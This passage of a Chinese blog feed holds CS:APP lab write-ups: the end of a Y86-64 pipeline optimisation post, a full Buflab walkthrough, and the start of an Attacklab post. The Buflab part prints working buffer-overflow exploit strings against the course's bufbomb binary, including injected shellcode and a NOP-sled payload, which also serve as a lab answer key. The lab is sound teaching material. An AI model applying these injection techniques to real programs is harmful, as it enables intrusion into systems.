stage，这个时候，我们并不知道(%rdi)的值具体是多少，也就是说，这个时候我们没办法通过data forwarding将数据送往decode stage。于是，rmmovq指令只好停留在本阶段，于是我们浪费了一个clock cycle，这是一种典型的load interlock, 处理办法是将另一个指令插入这两个指令中。然而下面的<b>andq %r10,%r10</b>指令我们也用不了，同样需要读取%r10，无法避免cycle的浪费. 因此，我们选择将下面的一个mrmovq提到上面来，即变成</p><blockquote><p>mrmovq (%rdi),%10<br>mrmovq 8(%rdi),%r9<br>rmmovq %r10,(%rsi)</p></blockquote><p>　　这样以来就不会发生cycle的浪费了。这个时候我们再进行测试的话，分数应该已经挺高了。当然，还有一些小小的优化可以调整。比如余数的处理上等等。这里给一个看到的处理得比较好的<a href="https://zhuanlan.zhihu.com/p/33751460" target="_blank" rel="noopener">文章</a>供参考，这篇文章作者还使用了一个三叉搜索树构造跳转表，再一次提高了效率(已经接近满分了)。这里我就不再赘述了。<br>　　其实我们会看到，想要提高CPE(CPI)，其实最主要就是三个方面，一个是use/load的冲突，如上面的mrmovq和rmmovq，这会消耗掉一个cycle；第二个是return语句，由于pipeline的设计，我们不知到会跳哪个位置，只能等到return执行到memory stage的时候才能确定，这将会浪费掉三个cycle；还有一个就是JXX中的条件跳转(非条件没有影响)，一旦分支预测错误，将会浪费掉两个cycle，而跳转指令在我们的程序中又特别的常见，因此，这是我们很大的一个优化方向，不仅是在这个实验当中。对于一个跳转指令，在特定的ISA下，我们应该尽量想办法在软件层面做处理，提高分支预测的准确率(比如在可能的情况下用data flow替换掉control flow)。书中也提到，现代的处理器的stage是远不止五个的，一旦分支预测出现错误，处理器调整的开销将长达十几个时钟周期。这个应该也是我看第四章留下的印象最深刻的地方吧。<br>　　下面是我的代码(其中也用到了其他一些小优化，比如分支的调整之类的)：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line">xorq %rax,%rax <span class="meta"># count = 0</span></span><br><span class="line">iaddq $<span class="number">-8</span>,%rdx   <span class="meta"># n - 8</span></span><br><span class="line">jl Test         <span class="meta"># <span class="meta-keyword">if</span> n &lt; 8 jump to Test</span></span><br><span class="line">Loop:</span><br><span class="line">  mrmovq (%rdi),%r10</span><br><span class="line">  mrmovq <span class="number">8</span>(%rdi),%r9</span><br><span class="line">  andq %r10,%r10</span><br><span class="line">  rmmovq %r10,(%rsi)</span><br><span class="line">  jle Npos1</span><br><span class="line">  iaddq $<span class="number">1</span>,%rax</span><br><span class="line">Npos1:</span><br><span class="line">  andq %r9,%r9</span><br><span class="line">  rmmovq %r9,<span class="number">8</span>(%rsi)</span><br><span class="line">  jle Npos2</span><br><span class="line">  iaddq $<span class="number">1</span>,%rax</span><br><span class="line">Npos2:</span><br><span class="line"></span><br><span class="line">  mrmovq <span class="number">16</span>(%rdi),%r10</span><br><span class="line">  mrmovq <span class="number">24</span>(%rdi),%r9</span><br><span class="line">  andq %r10,%r10</span><br><span class="line">  rmmovq %r10,<span class="number">16</span>(%rsi)</span><br><span class="line">  jle Npos3</span><br><span class="line">  iaddq $<span class="number">1</span>,%rax</span><br><span class="line">Npos3:</span><br><span class="line">  andq %r9,%r9</span><br><span class="line">  rmmovq %r9,<span class="number">24</span>(%rsi)</span><br><span class="line">  jle Npos4</span><br><span class="line">  iaddq $<span class="number">1</span>,%rax</span><br><span class="line">Npos4:</span><br><span class="line"></span><br><span class="line">  mrmovq <span class="number">32</span>(%rdi),%r10</span><br><span class="line">  mrmovq <span class="number">40</span>(%rdi),%r9</span><br><span class="line">  andq %r10,%r10</span><br><span class="line">  rmmovq %r10,<span class="number">32</span>(%rsi)</span><br><span class="line">  jle Npos5</span><br><span class="line">  iaddq $<span class="number">1</span>,%rax</span><br><span class="line">Npos5:</span><br><span class="line">  andq %r9,%r9</span><br><span class="line">  rmmovq %r9,<span class="number">40</span>(%rsi)</span><br><span class="line">  jle Npos6</span><br><span class="line">  iaddq $<span class="number">1</span>,%rax</span><br><span class="line">Npos6:</span><br><span class="line"></span><br><span class="line">  mrmovq <span class="number">48</span>(%rdi),%r10</span><br><span class="line">  mrmovq <span class="number">56</span>(%rdi),%r9</span><br><span class="line">  andq %r10,%r10</span><br><span class="line">  rmmovq %r10,<span class="number">48</span>(%rsi)</span><br><span class="line">  jle Npos7</span><br><span class="line">  iaddq $<span class="number">1</span>,%rax</span><br><span class="line">Npos7:</span><br><span class="line">  andq %r9,%r9</span><br><span class="line">  rmmovq %r9,<span class="number">56</span>(%rsi)</span><br><span class="line">  jle Npos8</span><br><span class="line">  iaddq $<span class="number">1</span>,%rax</span><br><span class="line">Npos8:</span><br><span class="line"></span><br><span class="line">  iaddq $<span class="number">64</span>, %rdi  <span class="meta"># add the *src, *dst</span></span><br><span class="line">  iaddq $<span class="number">64</span>, %rsi</span><br><span class="line">  iaddq $<span class="number">-8</span>, %rdx  <span class="meta"># sub i</span></span><br><span class="line">  jge Loop         <span class="meta"># loop</span></span><br><span class="line"></span><br><span class="line">Test:              <span class="meta"># n + 8 to deal with remaining numbers</span></span><br><span class="line">  iaddq $<span class="number">8</span>,%rdx</span><br><span class="line">  jne Rem1</span><br><span class="line">  ret</span><br><span class="line">Rem1:</span><br><span class="line">  mrmovq (%rdi), %r10</span><br><span class="line">  mrmovq <span class="number">8</span>(%rdi), %r9</span><br><span class="line">  andq %r10, %r10</span><br><span class="line">  jle Pos1</span><br><span class="line">  iaddq $<span class="number">1</span>, %rax</span><br><span class="line">Pos1:</span><br><span class="line">  rmmovq %r10, (%rsi)</span><br><span class="line">  iaddq $<span class="number">-1</span>, %rdx</span><br><span class="line">  jne Rem2</span><br><span class="line">  ret</span><br><span class="line"></span><br><span class="line">Rem2:</span><br><span class="line">  andq %r9, %r9</span><br><span class="line">  jle Pos2</span><br><span class="line">  iaddq $<span class="number">1</span>, %rax</span><br><span class="line">Pos2:</span><br><span class="line">  rmmovq %r9, <span class="number">8</span>(%rsi)</span><br><span class="line">  iaddq $<span class="number">-1</span>, %rdx</span><br><span class="line">  jne Rem3</span><br><span class="line">  ret</span><br><span class="line"></span><br><span class="line">Rem3:</span><br><span class="line">  mrmovq <span class="number">16</span>(%rdi), %r10</span><br><span class="line">  mrmovq <span class="number">24</span>(%rdi), %r9</span><br><span class="line">  andq %r10, %r10</span><br><span class="line">  jle Pos3</span><br><span class="line">  iaddq $<span class="number">1</span>, %rax</span><br><span class="line">Pos3:</span><br><span class="line">  rmmovq %r10, <span class="number">16</span>(%rsi)</span><br><span class="line">  iaddq $<span class="number">-1</span>, %rdx</span><br><span class="line">  jne Rem4</span><br><span class="line">  ret</span><br><span class="line"></span><br><span class="line">Rem4:</span><br><span class="line">  andq %r9, %r9</span><br><span class="line">  jle Pos4</span><br><span class="line">  iaddq $<span class="number">1</span>, %rax</span><br><span class="line">Pos4:</span><br><span class="line">  rmmovq %r9, <span class="number">24</span>(%rsi)</span><br><span class="line">  iaddq $<span class="number">-1</span>, %rdx</span><br><span class="line">  jne Rem5</span><br><span class="line">  ret</span><br><span class="line"></span><br><span class="line">Rem5:</span><br><span class="line">  mrmovq <span class="number">32</span>(%rdi), %r10</span><br><span class="line">  mrmovq <span class="number">40</span>(%rdi), %r9</span><br><span class="line">  mrmovq <span class="number">48</span>(%rdi), %r8</span><br><span class="line">  andq %r10, %r10</span><br><span class="line">  jle Pos5</span><br><span class="line">  iaddq $<span class="number">1</span>, %rax</span><br><span class="line">Pos5:</span><br><span class="line">  rmmovq %r10, <span class="number">32</span>(%rsi)</span><br><span class="line">  iaddq $<span class="number">-1</span>, %rdx</span><br><span class="line">  jne Rem6</span><br><span class="line">  ret</span><br><span class="line"></span><br><span class="line">Rem6:</span><br><span class="line">  andq %r9, %r9</span><br><span class="line">  jle Pos6</span><br><span class="line">  iaddq $<span class="number">1</span>, %rax</span><br><span class="line">Pos6:</span><br><span class="line">  rmmovq %r9, <span class="number">40</span>(%rsi)</span><br><span class="line">  iaddq $<span class="number">-1</span>, %rdx</span><br><span class="line">  jne Rem7</span><br><span class="line">  ret</span><br><span class="line"></span><br><span class="line">Rem7:</span><br><span class="line">  andq %r8, %r8</span><br><span class="line">  jle Pos7</span><br><span class="line">  iaddq $<span class="number">1</span>, %rax</span><br><span class="line">Pos7:</span><br><span class="line">  rmmovq %r8, <span class="number">48</span>(%rsi)</span><br></pre></td></tr></table></figure></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>　　这个实验本身来说难度并不能算大，甚至比课后练习还要稍微容易一点，但是需要对CPU的pipeline有比较清晰的了解，否则做起来会特别的吃力。由于我自己本身是读软件方面的，对硬件很多东西其实也不怎么了解(基本上师兄在说的时候也是觉得这一章可以不用怎么看)，加上现在才大一，很多知识，比如电路方面的都还没学，看得时候都要查一下一些概念什么的。当然最后我还是坚持顽强地把它啃下来了(算上实验和各种其他杂七杂八的东西，总共花了一个星期多一点吧)。花了很长的时间，尤其是pipeline那一块，到现在都觉得自己的理解并不是很到位，还有一些小细节没有搞清楚。我也不知到为什么一个读软件的要对涉及到已经几乎是硬件层面的东西要这么花时间，我也不知到自己花了这么长的时间去看这个究竟有没有意义。可能这就是对计算机的热爱吧(逃</p>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csapp </tag>
            
            <tag> y86-64 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>csapp-Buflab</title>
      <link href="/2019/01/15/csapp-Buflab/"/>
      <url>/2019/01/15/csapp-Buflab/</url>
      
        <content type="html"><![CDATA[<h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>　　这是csapp系列的第四篇文章了。具体题目请见<a href="http://csapp.cs.cmu.edu/3e/labs.html" target="_blank" rel="noopener">官网</a>。本文主要讲csapp中的buflab的部分流程和心得。如果有什么写得不好的地方，欢迎联系我修改(右下角小图标点开即可对话)。<br>　　本文建立在csapp完成了attacklab的基础上。如果还没完成上一个实验，请先将其完成再进行本实验。不过个人觉得上一个实验能够独立完成的话，这个实验难度就真的很小了。同样的，还是很建议先把官方给的<a href="http://csapp.cs.cmu.edu/3e/buflab32.pdf" target="_blank" rel="noopener">资料</a>看了之后再来做这个实验。不过笔者这边电脑看的时候有一些乱码，不知道其他电脑会不会一样。</p><h2 id="buflab-实验要求"><a href="#buflab-实验要求" class="headerlink" title="buflab 实验要求"></a>buflab 实验要求</h2><p>　　这个实验要求我们使用缓冲区溢出漏洞对bufbomb进行攻击。总共5个关卡。</p><blockquote><p>实验文件<br>bufbomb：我们需要攻击的对象<br>hex2raw：帮助我们成功攻击字符串的文件<br>makecookie：根据用户id产生对应的cookie (./makecookie [userid] 即可生成, 注意将[userid]替换成自己喜欢的字符串)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> val;</span><br><span class="line">  val = getbuf();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"No exploit. Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line">  Gets(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><h2 id="buflab-的一些注意点"><a href="#buflab-的一些注意点" class="headerlink" title="buflab 的一些注意点"></a>buflab 的一些注意点</h2><p>　　首先，本实验和上一个实验相比的话，难度还是要小了很多的。基本上除了最后一个level之外都没什么难度。但有一些不一样的细节需要注意<br>　　1. bufbomb在编译的时候加上了 -m32 参数，意味着无论你的电脑是否是64位系统，编译器遵循的都是IA-32规则。也就是说，我们需要用到的函数地址，指针等都是32位，这点和上一个实验不同，需要很小心。<br>　　2. 本实验中参数的传递比较接近RISC，参数是放在栈当中进行传递的，而不是放在%rdi,%rsi这样的寄存器上。所以建议完成本实验时，还是要多画图，结合图像来看的话要简单易懂很多。<br>　　3. 本实验和上一个实验基本上的架构是很相似的，我们需要做的事情也差不多，因此一些做法可以借鉴上一个实验中的相关关卡。</p><h3 id="level-0"><a href="#level-0" class="headerlink" title="level 0"></a>level 0</h3><p>　　首先，我们还是一样，先用objdump反编译，得到bufbomb.txt文件，便于查看。前面四道题中，都调用到了这样的函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NORMAL_BUFFER_SIZE 32</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[NORMAL_BUFFER_SIZE];</span><br><span class="line">  Gets(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　可以看到，和上一个实验基本没有区别。对于第一题来说，我们需要成功进入smoke()函数，只需将要丢弃的一大段字节随便填充上去，最后overwrite返回的地址即可。注意，这里的地址只有四个字节。答案就不贴了。</p><h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>　　这道题需要我们val这个数值传入fizz()函数，并且val等于我们的cookie。很简单，注意到这道题中传递参数是用栈来实现的，我们只要把cookie放在栈上即可，连代码注入都不需要。但一定要很小心字节的顺序，在这种问题上卡住还是很吃亏的。答案如下(其中60可以随意替换成其他值)：</p><blockquote><p>60 60 60 60 60 60 60 60<br>60 60 60 60 60 60 60 60<br>60 60 60 60 60 60 60 60<br>60 60 60 60 60 60 60 60<br>60 60 60 60 60 60 60 60<br>60 60 60 60 42 8c 04 08 // 跳转到fizz函数入口<br>60 60 60 60 c0 e5 c4 53 // 此行为cookie，注意前面的四个字节不能省掉</p></blockquote><h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>　　对于这道题，我们需要修改一个全局变量global_value的值，使其等于cookie。这道题就需要用到代码注入了。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $<span class="number">0x53c4e5c0</span>,%eax <span class="comment">// 左侧的值为cookie，我们先将其移动到%eax</span></span><br><span class="line">mov %eax,<span class="number">0x804d100</span>   <span class="comment">// 放入global_value所在的内存单元(这里的地址可以直接看反汇编文件得到)</span></span><br><span class="line">ret</span><br></pre></td></tr></table></figure></p><p>　　将上面的汇编代码编译，并反编译之后，我们就得到了它对应的机器级表示。在放进我们的文件(这里是bufbomb3.txt)当中，使用cat bufbomb3.txt | ./hex2raw | ./bufbomb -u [userid] 命令即可。我的bufbomb.3txt文件内容为：</p><blockquote><p>60 60 60 60 60 60 60 60<br>b8 c0 e5 c4 53 a3 00 d1<br>04 08 c3 60 60 60 60 60<br>60 60 60 60 60 60 60 60<br>60 60 60 60 60 60 60 60<br>60 60 60 60 00 39 68 55<br>9d 8c 04 08</p></blockquote><h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3><p>　　这道题开始有一定的难度了。本题目要求我们使用代码注入并且不能破坏原有的栈数据，最后使得getbuf函数返回cookie。有比较多的细节需要我们去注意。<br>　　首先，我们需要想到，怎样才不会破坏原有的栈数据呢？首先，我们不能覆盖到return address再往上的数据，也就是说，我们输入的字符串长度不能超过48，否则原有的某些数据可能会被我们覆盖。其次，在bufbomb的反汇编文件中，getbuf有<b>push %ebp</b>这样的指令将%ebp保存在栈上，而当我们覆盖了return address后，显然这个数据就丢失了。那怎么办？注意到这道题目中栈的位置不会发生改变。我们可以用gdb调试，在这个函数打一个断点，然后打印出放在栈上的这个值。到时在注入代码的时候记得把这个值放到%ebp即可。<br>　　为了能够顺利地回到test函数中，我们还要查看一下test函数在call getbuf后的下一个指令的位置，在我们的代码中要将PC更改为这个值，这样程序看起来就像是从getbuf当中返回了。<br>　　因此，我们可以得到答案：</p><blockquote><p>60 60 60 60 60 60 60 60<br>b8 c0 e5 c4 53 68 be 8d  // 将cookie放到%eax, 并把test中的下一个指令位置push进栈<br>04 08 c3 60 60 60 60 60<br>60 60 60 60 60 60 60 60<br>60 60 60 60 60 60 60 60<br>50 39 68 55 00 39 68 55  // 后面四个字节跳转到我们注入了代码的地址，前面四个字节对应着%ebp的值，pop的时候就会被放回%ebp了</p></blockquote><h3 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h3><p>　　不得不说，这道题当纯看题目要求时，觉得还是很变态的。首先，我们需要做到level3中的所有要求。其次，getbuf会被调用5次，我们需要每一次都能满足要求。并且，比较难的一点是，每一次getbuf的时候，stack的%esp(%ebp)指针的位置是不确定的，这也就意味着，我们没办法精确地跳转到我们注入的代码的位置。当然，如果还有印象的话，书中有提到对付ASLR的一种办法，就是使用nop指令，nop即no operation，CPU不会进行任何操作，相当与直接跳过这个指令。我们可以在注入的代码前面加入大量的nop，这样的话只要能够跳转到任意一个nop指令，PC就会像滑雪橇一样滑到我们注入的代码。我们只需要在最后的几行实现保存即可。<br>　　要保证栈不被破坏，我们在注入的代码中还需要做到以下几点：<br>　　1. 找到%ebp对应的值，并将其写入其中。<br>　　2. 将cookie放入%eax中，作为返回值<br>　　3. 注入代码的末尾需要将testn中的下一条指令push进栈当中，这样才能顺利返回到testn。同时，整个代码的总字符数必须为528，多了就溢出，栈被破坏，少了的话没办法覆盖掉return address。<br>　　其中2和3和上一个level没有区别，最主要是第一个，既然%ebp已经被覆盖了，我们要怎么知道它原先的值是多少呢？其实，我们可以从反汇编文件得到答案。%ebp其实就是testn的堆栈帧，我们看testn函数，它在push操作后，将%esp赋值给了%ebp，然后自己减掉了0x24，也就是说，call getbuf刚进入时，%esp + 0x24 + 4 = %ebp， 通过画图像，我们就可以很容易得到相关的规律了。小心push的时候%esp会-4。<br>　　以下是我的答案：</p><blockquote><p>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 b8 c0 e5 c4 53 68 3a<br>8e 04 08 8d 6c 24 2c c3 90 90 90 90 00 38 68 55</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csapp </tag>
            
            <tag> assembly </tag>
            
            <tag> overflow </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>csapp-Attacklab</title>
      <link href="/2019/01/15/csapp-Attacklab/"/>
      <url>/2019/01/15/csapp-Attacklab/</url>
      
        <content type="html"><![CDATA[<h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>　　这是csapp系列的第三篇文章。具体题目请见<a href="http://csapp.cs.cmu.edu/3e/labs.html" target="_blank" rel="noopener">官网</a>。本文主要讲csapp中的attacklab的流程和心得。如果有什么写得不好的地方，欢迎联系我修改(右下角小图标点开即可对话)。<br>　　个人觉得这个实验比起前面两个还是要稍微简单一点的，但是强烈建议把官网给的<a href="http://csapp.cs.cmu.edu/3e/bomblab.pdf" target="_blank" rel="noopener">资料</a>看一下，看完相信对完成这个实验还是有很大帮助的。整个实验主要是一开始无从下手以及最后一个level比较麻烦，但结合资料的相关提示的话，做起来难度还是不大的，建议尝试着不看任何其他教程自己独立完成。</p><h2 id="attacklab-实验要求"><a href="#attacklab-实验要求" class="headerlink" title="attacklab 实验要求"></a>attacklab 实验要求</h2><p>　　这个实验要求我们使用缓冲区溢出对ctarget和rtarget进行攻击。总共有五个关卡，其中，前三个要求使用代码注入(code injection)对ctarget进行攻击，后面两个要求使用return-oriented programming(ROP)对rtarget进行攻击。</p><blockquote><p>实验文件：<br>ctarget 和 rtarget：我们需要攻击的对象。<br>hex2raw：帮助我们用来生成攻击字符串的文件。<br>cookie: 识别文件，用来区分不同的用户(一般拿到的值是一个随机的8位16进制数)<br>farm.c：用于提供gadget，与后面两个关卡有关。</p></blockquote><blockquote><p>实验目的：<br>熟练掌握gdb和objdump的相关功能<br>加深对缓冲区溢出现象的理解，以及懂得如何简单地对某个程序进行缓冲区溢出攻击<br>了解x86-64的一些指令的编码等</p></blockquote><h2 id="target-文件的一些注意点"><a href="#target-文件的一些注意点" class="headerlink" title="target 文件的一些注意点"></a>target 文件的一些注意点</h2><p>　　无论是rtarget还是ctarget两个文件都有相似的构造。两个文件都包含有下面的函数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> val;</span><br><span class="line">  val = getbuf();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"No exploit. Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line">  Gets(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　其中，BUFFER_SIZE是宏定义，我们暂时不知道是多少，然后Gets()函数和gets()函数的功能基本相同。很明显，一旦我们输入的字符串比较长的时候，这就会产生缓冲区溢出的现象。因此，我们需要利用这一点，对该程序进行攻击。具体其他很多函数的细节，其实可以完全不去管。我们需要做的仅仅是生成一个特定的满足要求的字符串，通过overwrite栈上面的数据，使得getbuf函数无法顺利返回，并且，成功运行事先就存在于文件中的函数touchx()。<br>　　再次强调一下，所有需要了解的相关细节和知识点在官方资料中都有提到，本文基本上只是对该资料的部分内容进行翻译，以及提供一个完成该实验的思路，仅供参考。</p><h3 id="Part-I：level-1"><a href="#Part-I：level-1" class="headerlink" title="Part I：level 1"></a>Part I：level 1</h3><p>　　第一题比较简单，是让我们熟悉一下相关的一些操作。在正式开始实验以前，建议先使用objdump将rtarget和ctarget反编译，可以使用类似<b>objdump -d ctarget &gt; ctarget.txt </b>等命令将反编译文件写入txt中，便于查看。<br>　　我们先看一下getbuf中BUFFER_SIZE究竟是多少。查看ctarget.txt中的内容有以下几行：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000004017</span>a8 &lt;getbuf&gt;:</span><br><span class="line">  <span class="number">4017</span>a8:<span class="number">48</span> <span class="number">83</span> ec <span class="number">28</span>          sub    $<span class="number">0x28</span>,%rsp</span><br><span class="line">  <span class="number">4017</span>ac:<span class="number">48</span> <span class="number">89</span> e7             mov    %rsp,%rdi</span><br><span class="line">  <span class="number">4017</span>af:e8 <span class="number">8</span>c <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>       callq  <span class="number">401</span>a40 &lt;Gets&gt;</span><br><span class="line">  <span class="number">4017b</span>4:b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    $<span class="number">0x1</span>,%eax</span><br><span class="line">  <span class="number">4017b</span>9:<span class="number">48</span> <span class="number">83</span> c4 <span class="number">28</span>          add    $<span class="number">0x28</span>,%rsp</span><br><span class="line">  <span class="number">4017b</span>d:c3                   retq   </span><br><span class="line">  <span class="number">4017b</span>e:<span class="number">90</span>                   nop</span><br><span class="line">  <span class="number">4017b</span>f:<span class="number">90</span>                   nop</span><br></pre></td></tr></table></figure></p><p>　　由上图，我们可以看到，BUFFER_SIZE应该是一个小于40(0x28)的数字。%rsp+0x28上存放的地址就是函数正确返回的时候，PC需要指向的地址。这也是我们需要overwrite的地方。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span 